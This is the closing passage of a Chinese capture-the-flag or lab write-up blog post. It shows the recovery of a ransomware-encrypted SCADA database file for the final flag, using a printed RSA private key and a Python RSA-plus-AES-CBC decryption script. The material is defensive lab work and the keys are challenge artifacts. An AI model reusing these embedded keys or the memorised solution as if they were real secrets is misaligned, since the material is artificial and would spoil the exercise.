class="line">VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd</span><br><span class="line">FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy</span><br><span class="line">PHvLZB6D8zSyuGw=</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>可以解出key是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cli9gqXpTrm7CPMcdP9TSmVSzXVgSb3jrW+AakS7azk=</span><br></pre></td></tr></table></figure>

<p>使用 <code>AES KEY</code> 对文件 <code>ScadaDB.sql.locky</code> 进行解密。RSA + AES 解密的完整脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : iker</span></span><br><span class="line"><span class="comment"># @Time    : 2024/03/04 16:10</span></span><br><span class="line"><span class="comment"># @Function: RSA Privatekey Decryption &amp; AES CBC Decryption</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    private_key = <span class="string">&quot;&quot;&quot;-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALqC9ggGlbTFae2+</span></span><br><span class="line"><span class="string">PyH3HsdgK7brtrb7QTtuSXTMAJ3ruoBDwq0Lw8rMHm3IQNS51d3vjiVeZB8RU6f3</span></span><br><span class="line"><span class="string">YiM0p5p4VJn2Y2K7IWUixptX08HEay+mGFbH1WRv+FC0g1EXwIocjdRyCz/1qgqr</span></span><br><span class="line"><span class="string">rtaFqNAncaMDLGaTAz6Hasx3BQsRAgMBAAECgYEAtuLJ687BJ5RYraZac6zFQo17</span></span><br><span class="line"><span class="string">8A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDox</span></span><br><span class="line"><span class="string">RqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQN</span></span><br><span class="line"><span class="string">UM6ss/2/CMM/EgM9vz0CQQDZE+pqh9wn+mEindAUITKLSSPQVlFCaZaaICaD8LQz</span></span><br><span class="line"><span class="string">J5fbnmZ6PwiyDS/Cz080/dEsuPbk7Wlsgn5+rBZ9QSYXAkEA2/QGgIpqpxODaJLQ</span></span><br><span class="line"><span class="string">vjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbk</span></span><br><span class="line"><span class="string">Vfy5FwJBALpSudaOno1B/7XytvNQO04KjU75h+31K2tHRUfihwmRZmr/Xv52tEP/</span></span><br><span class="line"><span class="string">xYr03guiALTeXizJCsA0kdawZu1DyikCQDztieeNcCG77AjJsn0dyrUGwJlSpjx0</span></span><br><span class="line"><span class="string">VJBtlUVywVdMzMJHvIQgBOXUJHHLdxlvIw7CRkuK9CbDryEauYGAMh0CQCUtrbQd</span></span><br><span class="line"><span class="string">FiZttt6ZYSUK1qkr7PS3RHk3fHIDVqMk5DDpGCInkU0ZKP0bl7n4MaaZeGy/UUUy</span></span><br><span class="line"><span class="string">PHvLZB6D8zSyuGw=</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----&quot;&quot;&quot;</span></span><br><span class="line">    data = base64.b64decode(data)</span><br><span class="line">    priobj = Cipher_pkcs1_v1_5.new(RSA.importKey(private_key))</span><br><span class="line">    decrypted_data = priobj.decrypt(data,<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># style(string) – Padding algorithm.It can be ‘pkcs7’ (default), ‘iso7816’ or ‘x923’.</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) % AES.block_size != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> pad(data, AES.block_size, <span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_encrypt</span>(<span class="params">iv, key, data</span>):</span><br><span class="line">    key = padding(key)</span><br><span class="line">    data = padding(data)</span><br><span class="line">    iv = padding(iv)</span><br><span class="line"></span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    cipher_data = aes.encrypt(data)</span><br><span class="line">    <span class="keyword">return</span> cipher_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_decrypt</span>(<span class="params">iv, key, data</span>):</span><br><span class="line">    iv = padding(iv)</span><br><span class="line">    key = padding(key)</span><br><span class="line">    data = padding(data)</span><br><span class="line"></span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    data = aes.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">encrypted_filepath,output_filepath,key</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_filepath, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    iv = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    decryption_result = aes_cbc_decrypt(iv, key, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_filepath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(decryption_result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    encryptedAesKey = <span class="string">&quot;lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=&quot;</span></span><br><span class="line">    key = rsa_decrypt(encryptedAesKey)</span><br><span class="line">    encrypted_filepath = <span class="string">&quot;ScadaDB.sql.locky&quot;</span></span><br><span class="line">    output_filepath = <span class="string">&quot;ScadaDB.sql&quot;</span></span><br><span class="line">    decrypt_file(encrypted_filepath,output_filepath,key)</span><br></pre></td></tr></table></figure>

<p>运行解密出ScadaDB.sql,flag4在数据库里</p>
</div>
        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <span itemprop="copyrightNotice">本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</span>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
            
            
                <div class="post-actions text-center clearfix" id="post-actions">
                
                    <a class="donate" href="javascript:;" onclick="krOpenDonateModal()"><i class="fa fa-bitcoin"></i> 打赏</a>
                
                
                    <a class="share" href="javascript:;" onclick="krOpenShareModal()"><i class="fa fa-share-alt"></i> 分享</a>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    <a class="tag-none-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">靶机</a>
                </div>
                <div class="pull-date">
                    <time datetime="2025-05-02T14:00:33.448Z" itemprop="dateModified">最后编辑：2025-05-02</time>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" 群友机-Bamuwe" href="/2025/04/30/群友靶机-Bamuwe/"><i class="fa fa-angle-left"></i> 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" 春秋云镜-Flarum" href="/2025/05/05/春秋云镜-Flarum/">下一篇 <i class="fa fa-angle-right"></i></a>
            </div>
            
        </nav>
    
    
        <div class="comment-post">
            
        </div>
    
</article>

        

            </section>

            
                

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/touxiang.jpg" alt="lvzhouhang" loading="lazy" decoding="auto" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center"></p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                81
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                24
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                16
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix toc-div-class" >
    <div class="photo-background"></div>
    <h4 class="widget-title no-after">
        <i class="fa fa-compass"></i>
        文章目录
        <span class="toc-progress-bar" role="progressbar" aria-label="阅读进度："></span>
    </h4>
    <div class="textwidget">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG01"><span class="toc-text">FLAG01</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG02"><span class="toc-text">FLAG02</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG03"><span class="toc-text">FLAG03</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FLAG04"><span class="toc-text">FLAG04</span></a></li></ol>
    </div>
</aside>
                
                
  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
    <h4 class="widget-title"><i class="fa fa-folder"></i>分类列表</h4>
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/660930334/">660930334</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/BugKu/">BugKu</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/BugKu/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/HTB/">HTB</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HackMyVM/">HackMyVM</a><span class="category-list-count">22</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/JAVA/">JAVA</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/MISC/">MISC</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/MISC/NSSCTF/">NSSCTF</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/MISC/NSSCTF/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/boot2root/">boot2root</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/">ctf</a><span class="category-list-count">9</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf/%E5%A4%8D%E7%9B%98/">复盘</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/">ctfshow</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/">php特性</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctfshow/%E5%88%B7%E9%A2%98/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><span class="category-list-count">1</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/ctfshow/">ctfshow</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/ctfshow/%E5%88%B7%E9%A2%98/">刷题</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/java/">java</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a><span class="category-list-count">10</span></li></ul>
  </aside>


            
                
  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
      <div class="tag-clouds">
        <a href="/tags/BugKu/" style="font-size: 0.6em;">BugKu</a> <a href="/tags/JAVA/" style="font-size: 0.6em;">JAVA</a> <a href="/tags/MISC/" style="font-size: 0.6em;">MISC</a> <a href="/tags/NSSCTF/" style="font-size: 0.6em;">NSSCTF</a> <a href="/tags/ctf/" style="font-size: 0.7em;">ctf</a> <a href="/tags/ctfshow/" style="font-size: 0.73em;">ctfshow</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 0.68em;">php特性</a> <a href="/tags/sql/" style="font-size: 0.65em;">sql</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 0.63em;">sql注入</a> <a href="/tags/vulnhub/" style="font-size: 0.63em;">vulnhub</a> <a href="/tags/web/" style="font-size: 0.75em;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.6em;">代码审计</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.6em;">内网</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 0.78em;">刷题</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 0.6em;">文件包含</a> <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 0.8em;">靶机</a>
      </div>
  </aside>

            
                
  <aside id="krw-posts" class="widget widget-kratos-posts">
  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
  <div class="tab-content">
      <ul class="list-group">
        
        
          
          
            <a class="list-group-item" href="/2025/06/04/HTB-Fluffy/"><i class="fa fa-book"></i> HTB-Fluffy</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/05/10/HackmyVM-suidy/"><i class="fa fa-book"></i> HackmyVM-suidy</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/05/09/HTB-Heal/"><i class="fa fa-book"></i> HTB-Heal</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/05/09/HTB-Titanic/"><i class="fa fa-book"></i> HTB-Titanic</a>
            
          
        
          
          
            <a class="list-group-item" href="/2025/05/08/HackmyVM-Learn2Code/"><i class="fa fa-book"></i> HackmyVM-Learn2Code</a>
            
          
        
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
      </ul>
  </div>
  </aside>

            
    </div>
</section>
            

        

                </div>
    </div>
</div>

<footer>
    <div id="footer">
        <div class="container">
            <div class="row">
                <div class="col-md-6 col-md-offset-3 footer-list text-center">
                    <ul class="kratos-social-icons">
                        
                            <li>
                                <a href="https://github.com/kratos-rebirth" target="_blank" rel="nofollow">
                                    <i class="fa fa-github"></i>
                                </a>
                            </li>
                        
                            <li>
                                <a href="/atom.xml" target="_blank" rel="nofollow">
                                    <i class="fa fa-rss"></i>
                                </a>
                            </li>
                        
                    </ul>
                    <ul class="kratos-copyright">
                        <div>
                            <li>&copy; 2025 lvzhouhang 版权所有.</li>
                            <li>本站已在风雨中飘摇<span id="kr-since">Loading...</span></li>
                        </div>
                        <div>
                            <li>自豪地使用 <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a> 主题</li>
                            <li>站点由 <a href="https://github.com/Candinya/Kratos-Rebirth/graphs/contributors" target="_blank">lvzhouhang</a> 用 <i class="fa fa-heart" style="color:#d43f57"></i> 搭建</li>
                        </div>
                        <!-- 额外的追加注入项 -->
                        
                            <div>
                                
                                    <li>由 <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a> 强力驱动</li>
                                
                                    <li>在 <a href="https://github.io" target="_blank">Github Pages</a> 暖心托管</li>
                                
                            </div>
                        
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                <div class="box theme-box" id="theme-toggle">
                    <span class="fa fa-adjust"></span>
                </div>
            </div>
            <div id="gotop-box" class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>


    <div id="kr-donate-modal" class="kr-modal">
    <div class="kr-modal-bg" onclick="krCloseDonateModal()"></div>
    <div class="kr-modal-content">
        <div class="kr-modal-header">
            <div class="kr-modal-icon">
                <i class="fa fa-bitcoin"></i>
            </div>
            <div class="kr-modal-title">赞助喵</div>
            <button class="kr-modal-close" onclick="krCloseDonateModal()">
                <i class="fa fa-times-circle"></i>
            </button>
        </div>
        <div class="kr-modal-body">
            <div class="kr-donate-message">非常感谢您的喜欢！ <i class="fa fa-heart" style="color:#d43f57"></i></div>
            <div class="kr-donate-qr" id="kr-donate-qr">
                
                    <img class="kr-donate-placeholder" src="https://dev.krt.moe/demo-assets/donate.webp" alt="赞助喵" />
                
            </div>
            <div class="kr-donate-platforms">
                
                    
                        <button class="kr-donate-platform-button" style="color: skyblue;" title="模拟支付" onclick="krDonateModalShowPlatformQR('example_payment', 'skyblue')">
                            <i class="fa fa-credit-card"></i>
                        </button>
                    
                
            </div>
        </div>
    </div>
</div>
<script defer src="/js/kr-modal/donate.min.js"></script>




    <div id="kr-share-modal" class="kr-modal">
    <div class="kr-modal-bg" onclick="krCloseShareModal()"></div>
    <div class="kr-modal-content">
        <div class="kr-modal-header">
            <div class="kr-modal-icon">
                <i class="fa fa-share-alt"></i>
            </div>
            <div class="kr-modal-title">分享这一刻</div>
            <button class="kr-modal-close" onclick="krCloseShareModal()">
                <i class="fa fa-times-circle"></i>
            </button>
        </div>
        <div class="kr-modal-body">
            <div class="kr-share-message">让朋友们也来瞅瞅！</div>
            <div class="kr-share-qr" id="kr-share-qr"></div>
            <div class="kr-share-platforms">
                
                    <button class="kr-share-platform-button" style="color: #62b6e7;" title="喵窝" onclick="krShareModalOpenPlatform('https://nya.one/share?text=%3E%20$TITLE%0A%3E%0A%3E%20$SUMMARY%0A----%20$SITE%0A%0A$URL')">
                        <svg fill="currentColor" width="18" height="18" viewBox="0 0 329 388"><path d="M0,36.226c0,-19.993 16.233,-36.226 36.226,-36.226c13.788,0 25.787,7.719 31.908,19.068l188.366,229.845l0,-111.259c-6.356,5.508 -14.645,8.843 -23.707,8.843c-19.994,0 -36.226,-16.232 -36.226,-36.226c-0,-8.551 2.968,-16.413 7.93,-22.613l-0.015,-0.013l56.614,-69.08c6.2,-11.073 18.047,-18.565 31.63,-18.565c19.994,0 36.227,16.233 36.227,36.226l-0,314.644c-0,19.994 -16.233,36.226 -36.227,36.226c-13.166,0 -24.701,-7.039 -31.044,-17.555l-189.229,-230.899l-0,212.228c-0,19.994 -16.233,36.226 -36.227,36.226c-19.993,0 -36.226,-16.232 -36.226,-36.226l0,-314.644Z" /></svg>
                    </button>
                
            </div>
        </div>
    </div>
</div>
<script defer src="/js/kr-modal/share.min.js"></script>



<!-- 额外的追加注入项 -->


        <script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>


  <script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>



  <script defer src="/vendors/viewerjs@1.11.6/dist/viewer.min.js"></script>


<script defer src="/js/kr-core.min.js"></script>


  <script defer src="/js/kr-pjax.min.js"></script>


<!-- 额外的追加注入项 -->


    </body>
</html>